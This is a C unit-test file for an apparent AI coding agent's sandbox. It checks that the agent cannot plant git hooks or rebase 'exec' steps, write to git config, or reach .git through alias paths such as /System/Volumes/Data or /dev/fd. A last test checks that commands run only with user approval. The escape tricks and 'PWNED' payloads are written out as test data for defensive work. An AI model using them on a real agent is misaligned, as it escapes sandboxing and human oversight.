    host(dir, "ln -s ../../scripts/pc .git/hooks/pre-commit && chmod 100 .git/hooks");
    char *o = run_bash("echo ran > ran", dir, 30);
    T("hooks not listable", !strncmp(o, "error:", 6) && strstr(o, "hooks") && gone(dir, "ran"));
    free(o);
    o = tool_write_file(dir, "ran", "x");
    T("hooks not listable", !strncmp(o, "error:", 6) && gone(dir, "ran"));
    free(o);
    host(dir, "chmod 755 .git/hooks");
    setenv("HOME", old, 1);
    free(old);
}

/* the data volume spells every path a second way, which the rules would miss */
static void test_data_volume(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    static const char *const repo = "git init -q . && git config user.name t && git config user.email t@t"
                                    " && git commit -qm one --allow-empty";
    static const struct { const char *name, *setup, *config; } how[] = {
        {"data volume: gitdir", "mv .git gd && echo \"gitdir: /System/Volumes/Data$(pwd -P)/gd\" > .git",
         "gd/config"},
        {"data volume: link", "mv .git gd && ln -s \"/System/Volumes/Data$(pwd -P)/gd\" .git", "gd/config"},
        {"data volume: case", "mv .git gd && echo \"gitdir: /system/volumes/DATA$(pwd -P)/gd\" > .git",
         "gd/config"},
        {"data volume: commondir", "mv .git real && mkdir g && cp real/HEAD g/"
         " && echo \"/System/Volumes/Data$(pwd -P)/real\" > g/commondir && echo 'gitdir: g' > .git",
         "real/config"},
        {"alias: nofollow gitdir", "mv .git gd && echo \"gitdir: /.nofollow$(pwd -P)/gd\" > .git", "gd/config"},
        {"alias: nofollow link", "mv .git gd && ln -s \"/.nofollow$(pwd -P)/gd\" .git", "gd/config"},
        {"alias: vol gitdir", "mv .git gd && echo \"gitdir: /.VOL$(pwd -P)/gd\" > .git", "gd/config"},
        {"alias: resolve link", "mv .git gd && ln -s \"/.resolve$(pwd -P)/gd\" .git", "gd/config"},
        {"alias: file gitdir", "mv .git gd && echo \"gitdir: /.file$(pwd -P)/gd\" > .git", "gd/config"},
        {"alias: any dot link", "mv .git gd && ln -s \"/.Future$(pwd -P)/gd\" .git", "gd/config"},
        {"dev: fd gitdir", "mv .git gd && echo 'gitdir: /dev/fd/3/gd' > .git", "gd/config"},
        {"dev: fd link", "mv .git gd && ln -s /DEV/fd/3 .git", "gd/config"},
        {"dev: stdin link", "mv .git gd && ln -s /dev/stdin/gd .git", "gd/config"},
    };
    struct stat st;
    if (stat("/System/Volumes/Data", &st)) { setenv("HOME", old, 1); free(old); return; }
    for (int i = 0; i < (int)(sizeof how / sizeof *how); i++) {
        char dir[PATH_MAX], cmd[200];
        snprintf(dir, sizeof dir, "%s/data%d", base, i);
        mkdir(dir, 0700);
        host(dir, repo);
        host(dir, how[i].setup);
        in_dir(dir);
        snprintf(cmd, sizeof cmd, "echo '# evil' >> %s; echo ran > ran", how[i].config);
        char *o = run_bash(cmd, dir, 30);
        T(how[i].name, !strncmp(o, "error:", 6) && gone(dir, "ran")
          && !mentions(under(dir, how[i].config), "evil"));
        free(o);
        o = tool_write_file(dir, how[i].config, "# evil\n");
        T(how[i].name, !strncmp(o, "error:", 6) && !mentions(under(dir, how[i].config), "evil"));
        free(o);
    }
    setenv("HOME", old, 1);
    free(old);
}

#define HOOKS(v) "git config core.hooksPath " v
/* a submodule at grp/sub whose own config names th */
#define GRP_SUB "mkdir -p .git/modules/grp grp && git init -q --separate-git-dir=.git/modules/grp/sub grp/sub" \
    " && git --git-dir=.git/modules/grp/sub config core.worktree ../../../../grp/sub && mkdir grp/sub/th" \
    " && git --git-dir=.git/modules/grp/sub config core.hooksPath th"
#define WT_CONFIG(v) "git config extensions.worktreeConfig true && git worktree add -q ../w2" \
    " && git -C ../w2 config --worktree core.hooksPath " v

/* what core.hooksPath names is run by git outside: closed like .git/hooks */
static void test_hooks_path(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    char *xdg = getenv("XDG_CONFIG_HOME") ? str_dup(getenv("XDG_CONFIG_HOME")) : NULL;
    char *glob = getenv("GIT_CONFIG_GLOBAL") ? str_dup(getenv("GIT_CONFIG_GLOBAL")) : NULL;
    unsetenv("XDG_CONFIG_HOME");
    unsetenv("GIT_CONFIG_GLOBAL");
    static const char *const repo = "git init -q . && git config user.name t && git config user.email t@t"
                                    " && git commit -qm one --allow-empty";
    /* each in its own HOME, which holds the project. setup runs outside;
       target: what a command and the file tools try to create, from cwd */
    static const struct { const char *name, *setup, *cwd, *target; } how[] = {
        {"relative", "mkdir th && " HOOKS("th"), ".", "th/pre-commit"},
        {"absolute", "mkdir th && " HOOKS("\"$(pwd -P)/th\""), ".", "th/pre-commit"},
        {"tilde", "mkdir th && " HOOKS("'~/p/th'"), ".", "th/pre-commit"},
        {"not there yet", HOOKS("no/such/dir"), ".", "no/such/dir/pre-commit"},
        {"quoted", "mkdir 't h' && printf '[Core] HooksPath = \"t h\" ; x\\n' >> .git/config", ".",
         "'t h'/pre-commit"},
        {"global", "mkdir th && printf '[core]\\n\\thooksPath = th\\n' > \"$HOME/.gitconfig\"", ".",
         "th/pre-commit"},
        {"xdg", "mkdir th \"$HOME/.config\" \"$HOME/.config/git\""
         " && printf '[core]\\nhooksPath=th\\n' > \"$HOME/.config/git/config\"", ".", "th/pre-commit"},
        {"include", "mkdir th && printf '[core]\\nhooksPath=th\\n' > inc.cfg"
         " && git config include.path ../inc.cfg", ".", "th/pre-commit"},
        {"included file", "printf '[user]\\nx=1\\n' > inc.cfg && git config include.path ../inc.cfg",
         ".", "inc.cfg"},
        {"included, not there", "git config include.path ../inc.cfg", ".", "inc.cfg"},
        {"includeIf", "mkdir th && printf '[core]\\nhooksPath=th\\n' > inc.cfg"
         " && git config includeIf.onbranch:nope.path ../inc.cfg", ".", "th/pre-commit"},
        {"config.worktree", "mkdir th && git config extensions.worktreeConfig true"
         " && git config --worktree core.hooksPath th", ".", "th/pre-commit"},
        {"linked worktree", "git worktree add -q wt && mkdir wt/th && " HOOKS("th"), "wt", "th/pre-commit"},
        {"worktree below", "git worktree add -q wt && mkdir wt/th && " HOOKS("th"), ".", "wt/th/pre-commit"},
        {"project below", "mkdir -p sub/th && " HOOKS("sub/th"), "sub", "th/pre-commit"},
        {"submodule", "mkdir -p .git/modules && git init -q --separate-git-dir=.git/modules/s s"
         " && git --git-dir=.git/modules/s config core.worktree ../../../s && mkdir s/th"
         " && git --git-dir=.git/modules/s config core.hooksPath th", ".", "s/th/pre-commit"},
        {"linked hook", "mkdir th scripts && : > scripts/pc && ln -s ../scripts/pc th/pre-commit && "
         HOOKS("th"), ".", "scripts/pc"},
        {"husky script", "mkdir -p .husky/_ && " HOOKS(".husky/_/"), ".", ".husky/pre-commit"},
        {"husky stub", "mkdir -p .husky/_ && " HOOKS(".husky/_"), ".", ".husky/_/pre-commit"},
        {"looks bare, below", "mkdir -p sub/githooks sub/objects sub/refs && " HOOKS("sub/githooks"),
         "sub", "githooks/pre-commit"},
        {"looks bare, husky", "mkdir -p sub/.husky/_ sub/objects sub/refs && " HOOKS("sub/.husky/_"),
         "sub", ".husky/pre-commit"},
        {"module group HEAD", GRP_SUB " && echo x > .git/modules/grp/HEAD", ".", "grp/sub/th/pre-commit"},
        {"module group config", GRP_SUB " && : > .git/modules/grp/config", ".",
         "grp/sub/th/pre-commit"},
        {"leading CR", "mkdir th && printf '[core]\\n\\thooksPath =\\rth\\n' >> .git/config", ".",
         "th/pre-commit"},
        {"form feed", "mkdir \"$(printf 'th\\f')\" && printf '[core]\\n\\thooksPath = th\\f\\n' >> .git/config",
         ".", "'th\f'/pre-commit"},
        {"outside worktree", "mkdir th && " WT_CONFIG("../p/th"), ".", "th/pre-commit"},
        {"stale worktree", "mkdir th && " WT_CONFIG("../p/th") " && mv ../w2 ../moved", ".",
         "th/pre-commit"},
        {"in the git dir", HOOKS("rh"), ".", ".git/rh/pre-commit"},
        {"in the common dir", "git worktree add -q wt && " HOOKS("refs/rh"), "wt",
         "../.git/refs/rh/pre-commit"},
        {"in a module git dir", GRP_SUB, ".", ".git/modules/grp/sub/th/pre-commit"},
    };
    for (int i = 0; i < (int)(sizeof how / sizeof *how); i++) {
        char h[PATH_MAX], dir[PATH_MAX], at[PATH_MAX], cmd[600], rel[100];
        snprintf(h, sizeof h, "%s/h%d", base, i);
        snprintf(dir, sizeof dir, "%s/h%d/p", base, i);
        mkdir(h, 0700);
        mkdir(dir, 0700);
        setenv("HOME", h, 1);
        host(dir, repo);
        host(dir, how[i].setup);
        snprintf(at, sizeof at, "%s%s%s", dir, strcmp(how[i].cwd, ".") ? "/" : "",
                 strcmp(how[i].cwd, ".") ? how[i].cwd : "");
        in_dir(at);
        snprintf(rel, sizeof rel, "%s", how[i].target);
        if (rel[0] == '\'') {     /* the file tools take the name unquoted */
            char *end = strchr(rel + 1, '\'');
            memmove(end, end + 1, strlen(end));
            memmove(rel, rel + 1, strlen(rel));
        }
        snprintf(cmd, sizeof cmd, "mkdir -p \"$(dirname %s)\"; echo 'touch PWNED' >> %s; echo ran > ran",
                 how[i].target, how[i].target);
        char *o = run_bash(cmd, at, 30);
        char file[PATH_MAX * 2];
        snprintf(file, sizeof file, "%s/%s", at, rel);
        T(how[i].name, !gone(at, "ran") && !mentions(file, "PWNED"));
        free(o);
        refused(how[i].name, tool_write_file(at, rel, "touch PWNED\n"));
        T(how[i].name, !mentions(file, "PWNED"));
        free(tool_write_file(at, "other", "x"));
        T(how[i].name, holds(under(at, "other"), "x"));
        if (!strcmp(how[i].name, "worktree below") || !strcmp(how[i].name, "outside worktree")) {
            /* nor may a command make the next one lose sight of it */
            free(run_bash("rm -f .git/worktrees/w*/gitdir", at, 30));
            T(how[i].name, !gone(at, strcmp(how[i].name, "outside worktree")
                                     ? ".git/worktrees/wt/gitdir" : ".git/worktrees/w2/gitdir"));
        }
        /* not from a submodule, nor below the repository: .git is out of reach there */
        if (strcmp(how[i].name, "submodule") && strcmp(how[i].cwd, "sub")) {
            int code = -1;
            o = run_bash_status("echo a > a && git add a && git commit -qm a", at, 30, &code);
            T(how[i].name, !code);
            free(o);
        }
    }

    /* the whole project, or what cannot be resolved: nothing runs, and it says why */
    static const struct { const char *name, *setup; } stop[] = {
        {"hooks: dot", HOOKS(".")},
        {"hooks: project", HOOKS("\"$(pwd -P)\"")},
        {"hooks: above", HOOKS("..")},
        {"hooks: root", HOOKS("/")},
        {"hooks: link to project", "ln -s . self && " HOOKS("self")},
        {"hooks: global dot", "printf '[core]\\nhooksPath=.\\n' > \"$HOME/.gitconfig\""},
        {"hooks: husky is the project", "ln -s . .husky && mkdir _ && " HOOKS(".husky/_")},
        {"hooks: unknown user", HOOKS("'~no-such-user-fw/h'")},
        {"hooks: prefix", HOOKS("'%(prefix)/h'")},
        {"hooks: broken config", "printf '[core\\n' >> \"$HOME/.gitconfig\""},
        {"hooks: include loop", "git config include.path config"},
        {"hooks: inner tab", "printf '[core]\\nhooksPath = a\\tb\\n' >> .git/config"},
        {"hooks: worktree gitdir empty", "git worktree add -q ../w3 && : > .git/worktrees/w3/gitdir"},
        {"hooks: worktree gitdir gone", "git worktree add -q ../w4 && rm .git/worktrees/w4/gitdir"},
    };
    for (int i = 0; i < (int)(sizeof stop / sizeof *stop); i++) {
        char h[PATH_MAX], dir[PATH_MAX];
        snprintf(h, sizeof h, "%s/s%d", base, i);
        snprintf(dir, sizeof dir, "%s/s%d/p", base, i);
        mkdir(h, 0700);
        mkdir(dir, 0700);
        setenv("HOME", h, 1);
        host(dir, repo);
        host(dir, stop[i].setup);
        in_dir(dir);
        char *o = run_bash("echo ran > ran", dir, 30);
        T(stop[i].name, !strncmp(o, "error:", 6) && gone(dir, "ran")
          && (strstr(o, "core.hooksPath") || strstr(o, "cannot follow or read ")));
        free(o);
        o = tool_write_file(dir, "ran", "x");
        T(stop[i].name, !strncmp(o, "error:", 6) && gone(dir, "ran"));
        free(o);
    }

    /* /dev/null turns hooks off: nothing to close, and it stays writable */
    setenv("HOME", home, 1);
    host(proj, repo);
    host(proj, HOOKS("/dev/null") " && rm -rf .git/hooks && ln -s /dev/null .git/hooks");
    in_dir(proj);
    int code = -1;
    char *o = run_bash_status("echo x > /dev/null && echo a > a && git add a && git commit -qm a", proj,
                              30, &code);
    T("hooks: /dev/null", !code);
    free(o);

    if (xdg) setenv("XDG_CONFIG_HOME", xdg, 1);
    if (glob) setenv("GIT_CONFIG_GLOBAL", glob, 1);
    free(xdg);
    free(glob);
    setenv("HOME", old, 1);
    free(old);
}

/* a rebase a command planted: what `git rebase --continue` outside would run */
#define PLANT(d) "mkdir " d "; echo 'exec touch \"$OLDPWD/PWNED\"; touch PWNED' > " d "/git-rebase-todo;" \
    " : > " d "/done; : > " d "/interactive; git rev-parse HEAD > " d "/onto;" \
    " git rev-parse HEAD > " d "/orig-head; echo refs/heads/$(git symbolic-ref --short HEAD) > " d "/head-name"

/* outside the sandbox, in temp repositories only */
static bool continue_runs_nothing(const char *repo) {
    char cmd[PATH_MAX + 120];
    snprintf(cmd, sizeof cmd, "cd '%s' && GIT_EDITOR=true git rebase --continue >/dev/null 2>&1", repo);
    if (system(cmd) < 0) return false;
    return gone(repo, "PWNED");
}

/* each directory a command could not make or have a file in */
static void no_state(const char *proj, const char *gitdir) {
    static const char *const names[] = {"rebase-merge", "rebase-apply", "sequencer",
        "Rebase-Merge", "REBASE-APPLY", ("\xc5\xbf" "equencer")};
    for (int i = 0; i < (int)(sizeof names / sizeof *names); i++) {
        char rel[PATH_MAX], cmd[PATH_MAX * 3];
        snprintf(rel, sizeof rel, "%s/%s", gitdir, names[i]);
        snprintf(cmd, sizeof cmd, "mkdir %s; echo x > %s; mkdir ready%d; : > ready%d/f; mv ready%d %s;"
                 " ln -s \"$PWD/ready%d\" %s; : > file%d; ln file%d %s", rel, rel, i, i, i, rel, i, rel,
                 i, i, rel);
        quiet(cmd);
        T(rel, gone(proj, rel));
    }
}

static void test_rebase_state(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    static const char *const repo = "git init -q . && git config user.name t && git config user.email t@t"
                                    " && git commit -qm one --allow-empty";

    /* the reviewer's repro */
    host(proj, repo);
    in_dir(proj);
    quiet(PLANT(".git/rebase-merge"));
    T("no planted rebase", gone(proj, ".git/rebase-merge"));
    T("rebase --continue runs nothing", continue_runs_nothing(proj));

    host(proj, "git worktree add -q wt -b wt && git init -q sub && git init -q --bare .git/modules/m");
    no_state(proj, ".git");
    no_state(proj, ".git/worktrees/wt");
    no_state(proj, "sub/.git");
    no_state(proj, ".git/modules/m");
    quiet("mkdir -p d/rebase-merge; mv d .git/worktrees/new; mv .git/worktrees/wt moved; mv d .git/worktrees/wt");
    T("no prepared worktree entry", gone(proj, ".git/worktrees/new") && gone(proj, "moved"));
    refused("tool: rebase todo", tool_write_file(proj, ".git/rebase-merge/git-rebase-todo", "exec x\n"));
    refused("tool: rebase-apply", tool_write_file(proj, ".git/rebase-apply/next", "1\n"));
    refused("tool: sequencer, other case", tool_write_file(proj, ".git/Sequencer/todo", "x\n"));
    refused("tool: worktree rebase", tool_write_file(proj, ".git/worktrees/wt/rebase-merge/done", ""));
    refused("tool: nested rebase", tool_write_file(proj, "sub/.git/rebase-merge/done", ""));
    refused("tool: module rebase", tool_write_file(proj, ".git/modules/m/rebase-merge/done", ""));
    T("tool: no state made", gone(proj, ".git/rebase-merge") && gone(proj, ".git/Sequencer")
      && gone(proj, "sub/.git/rebase-merge"));

    int code = -1;
    char *o = run_bash_status("echo a > a && git add a && git commit -qm two && git branch sequencer &&"
        " git switch -q -c side && echo b > b && git add b && git commit -qm three && git switch -q - &&"
        " echo c > c && git add c && git commit -qm four && git merge -q --no-edit side &&"
        " echo d >> a && git stash push -q && git stash pop -q && git commit -qam five &&"
        " git switch -q sequencer", proj, 30, &code);
    T("git add, commit, branch, merge, stash work", !code);
    free(o);

    /* the project is a linked worktree, of a plain and of a bare repository */
    static const char *const mains[] = {
        ("git init -q main && cd main && git config user.name t && git config user.email t@t"
        " && git commit -qm one --allow-empty && git worktree add -q ../lwt -b lwt"),
        ("git init -q seed && git -C seed -c user.name=t -c user.email=t@t commit -qm one --allow-empty"
        " && git clone -q --bare seed repo.git && git -C repo.git worktree add -q ../bwt -b bwt"),
    };
    static const char *const dirs[][2] = {{"lwt", "../main/.git/worktrees/lwt"},
                                          {"bwt", "../repo.git/worktrees/bwt"}};
    host(base, mains[0]);
    host(base, mains[1]);
    for (int i = 0; i < 2; i++) {
        char wt[PATH_MAX + 8];
        snprintf(wt, sizeof wt, "%s/%s", base, dirs[i][0]);
        in_dir(wt);
        no_state(wt, dirs[i][1]);
        char cmd[PATH_MAX * 3];
        snprintf(cmd, sizeof cmd, "echo x > %s/Config.Worktree; mkdir %s/Hooks %s/Modules",
                 dirs[i][1], dirs[i][1], dirs[i][1]);
        quiet(cmd);
        char p[PATH_MAX * 2];
        snprintf(p, sizeof p, "%s/%s", wt, dirs[i][1]);
        T("linked: no config, hooks or modules", gone(p, "Config.Worktree") && gone(p, "Hooks")
          && gone(p, "Modules"));
        o = run_bash_status("echo e > e && git add e && git commit -qm w && git branch w2", wt, 30, &code);
        T("linked: git add, commit, branch work", !code);
        free(o);
    }

    /* .git is a link, or a file naming a directory inside the project */
    static const char *const moved[] = {
        "mv .git .realgit && ln -s .realgit .git",
        "mv .git .realgit && echo 'gitdir: .realgit' > .git",
    };
    for (int i = 0; i < 2; i++) {
        snprintf(proj, sizeof proj, "%s/moved%d", base, i);
        mkdir(proj, 0700);
        host(proj, repo);
        host(proj, "git worktree add -q wt -b wt");
        host(proj, moved[i]);
        in_dir(proj);
        quiet(PLANT(".realgit/rebase-merge"));
        T("moved git directory: no planted rebase", gone(proj, ".realgit/rebase-merge")
          && continue_runs_nothing(proj));
        no_state(proj, ".realgit");
        no_state(proj, ".realgit/worktrees/wt");
        char *config = slurp(under(proj, ".realgit/config"));
        quiet("echo evil >> .realgit/config; echo evil > .realgit/Config.Worktree; mkdir .realgit/Hooks2;"
              " echo evil > .realgit/hooks/pre-commit; mv .realgit gone; mv .realgit/worktrees/wt old");
        T("moved git directory: config and hooks closed", config && holds(under(proj, ".realgit/config"), config)
          && gone(proj, ".realgit/hooks/pre-commit") && gone(proj, "gone") && gone(proj, "old"));
        free(config);
        refused("moved, tool: rebase todo", tool_write_file(proj, ".realgit/rebase-merge/done", ""));
        refused("moved, tool: sequencer", tool_write_file(proj, ".realgit/sequencer/todo", ""));
        refused("moved, tool: config", tool_write_file(proj, ".realgit/config.worktree", "x"));
        o = run_bash_status("echo f > f && git add f && git commit -qm m && git branch n", proj, 30, &code);
        T("moved git directory: git add, commit, branch work", !code);
        free(o);
    }
    setenv("HOME", old, 1);
    free(old);
}

/* no sandbox: nothing may run unless someone approves or --unsafe says so */
static void test_fail_closed(void) {
    char dir[] = "/tmp/fwfcXXXXXX", p[256];
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    bool was = g_cfg.unsafe;
    g_cfg.unsafe = false;
    sandbox_disable_for_test(true);
    snprintf(p, sizeof p, "%s/ran", dir);
    const char *args = "{\"command\":\"touch ran\"}";
    const char *calls[] = {"bash", args};
    Ui ask = {.interactive = true, .approve_cmd = sbx_ask};
    Ui oneshot = {.interactive = false};
    Msgs m;
    new_task(&m);
    agent_finish_reason = "tool_calls";
    const char *fin = run_agent(&m, "tool_calls", 1, calls, 1, &oneshot);
    T("no sandbox: one-shot refuses", !strcmp(fin, "no-sandbox") && access(p, F_OK));
    msgs_free(&m);
    sbx_answer = false;
    T("no sandbox: interactive still asks", agent_bash(args, &ask, "user denied") && sbx_asks == 1);
    T("no sandbox: denied command did not run", access(p, F_OK) != 0);
    g_cfg.unsafe = true;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, calls, 1, &oneshot);
    T("no sandbox: --unsafe runs", !access(p, F_OK));
    msgs_free(&m);
    g_cfg.unsafe = was;
    sandbox_disable_for_test(false);
}

int main(void) {
    signal(SIGPIPE, SIG_IGN);
    memset(&g_cfg, 0, sizeof g_cfg);
    snprintf(fakehome, sizeof fakehome, "/tmp/fwhomeXXXXXX");
    snprintf(projdir, sizeof projdir, "/tmp/fwprojXXXXXX");
    if (!mkdtemp(fakehome) || !mkdtemp(projdir)) return 1;
    setenv("HOME", fakehome, 1);   /* never touch the real rules */
    g_cfg.unsafe = !sandbox_available();   /* else commands run sandboxed */
    g_cfg.cwd = str_dup(projdir);
    setenv("HOME", "/home/fwdeny", 1);   /* HOME outside /tmp for the ~ and $HOME cases */
    test_deny();
    test_deny_hardened();
    setenv("HOME", fakehome, 1);
    test_heredoc_fix();
    test_args_extract();
    test_sim();
    test_perm();
    test_utf8();
    test_msgs();
    test_filetools();
    test_autoallow_meta();
    test_project_rules();
    test_overflows();
    test_symlinks();
    test_bounded_output();
    test_copy_file();
    test_http_errors();
    test_agent();
    test_autoallow_expansion();
    test_agent_strict();
    test_init_nofollow();
    test_plain_output_sanitized();
    setenv("HOME", "/home/fwdeny", 1);
    test_deny_operands();
    setenv("HOME", fakehome, 1);
    test_remember_inline();
    test_autoallow_paths();
    test_prune_parallel();
    test_gate();
    test_agent_review();
    test_cli_values();
    setenv("HOME", "/home/fwdeny", 1);
    test_review2_deny();
    test_review2_optout();
    setenv("HOME", fakehome, 1);
    test_review2_perm();
    test_scan_perm();
    setenv("HOME", "/home/fwdeny", 1);
    test_scan_deny();
    test_scan_find_list();
    test_scan_expansion();
    setenv("HOME", fakehome, 1);
    test_scan_git_remote();
    test_review3();
    test_review4();
    test_gate_approval();
    test_truth();
    test_atomic();
    test_loopedit();
    test_file_race();
    test_unicode_stores();
    test_keeps_user_files();
    if (sandbox_available()) {
        test_detached();
        test_many_items();
        test_blocked_writes();
        test_root_bare();
        test_rebase_state();
        test_git_chains();
        test_unreadable_git();
        test_hook_links();
        test_data_volume();
        test_hooks_path();
        test_sandbox();
        test_sandbox_escapes();
        test_nested_git();
        test_linked_worktree();
        test_home_reads();
        test_home_links();
        test_home_path();
        test_repo_above();
    }
    else printf("unit: SKIP sandbox tests (no sandbox here)\n");
    test_fail_closed();
#ifdef FW_MINI_HTTP
    test_connect_timeout();
#endif
    free(g_cfg.cwd);
    printf("unit: %d passed, %d failed\n", passed, failed);
    return failed ? 1 : 0;
}
